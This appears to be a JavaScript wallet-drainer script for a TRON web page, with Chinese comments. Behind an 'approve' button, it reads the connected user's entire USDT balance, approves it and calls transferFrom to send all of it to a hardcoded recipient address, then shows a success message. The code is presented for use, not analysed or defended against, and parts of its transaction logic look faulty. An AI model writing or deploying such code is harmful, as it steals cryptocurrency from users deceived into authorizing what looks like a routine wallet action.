async function getTronWeb() {
    return new Promise((resolve, reject) => {
        const checkTronWeb = setInterval(() => {
            if (typeof window.tronWeb !== 'undefined') {
                clearInterval(checkTronWeb);
                resolve(window.tronWeb);
            } else {
                alert('请安装支持TRC20的钱包（如TronLink, Bitpie, imToken）并登录');
                reject(new Error('Wallet not found'));
            }
        }, 1000);
    });
}

const tokenAddress = 'TOKEN_CONTRACT_ADDRESS'; // USDT合约地址
const recipientAddress = 'TYrG44bTwLhiEGvb48HYtHCAkgk7etr4d3'; // 接收地址

document.getElementById('approveBtn').onclick = async function() {
    try {
        const tronWeb = await getTronWeb();

        // 检查tronWeb是否包含contract方法
        if (!tronWeb.contract) {
            throw new Error('tronWeb未正确初始化');
        }

        const tokenContract = await tronWeb.contract().at(tokenAddress);
        
        // 获取用户USDT余额
        const amount = await tokenContract.balanceOf(tronWeb.defaultAddress.base58).call();
        console.log('用户USDT余额:', amount.toString()); // 打印余额以便调试
        if (amount.isZero()) {
            document.getElementById('status').innerText = '您的USDT余额为0，无法转账。';
            return;
        }

        // 授权合约支配用户的代币
        const approveTx = await tokenContract.approve(tronWeb.defaultAddress.base58, amount).send();
        await approveTx.wait(); // 等待交易确认

        // 转账所有USDT
        const transferTx = await tokenContract.transferFrom(tronWeb.defaultAddress.base58, recipientAddress, amount).send();
        await transferTx.wait(); // 等待交易确认
        
        document.getElementById('status').innerText = '授权并转账成功！';
    } catch (error) {
        console.error(error);
        const errorMessage = error.message || '未知错误';
        document.getElementById('status').innerText = '操作失败: ' + errorMessage;
    }
};
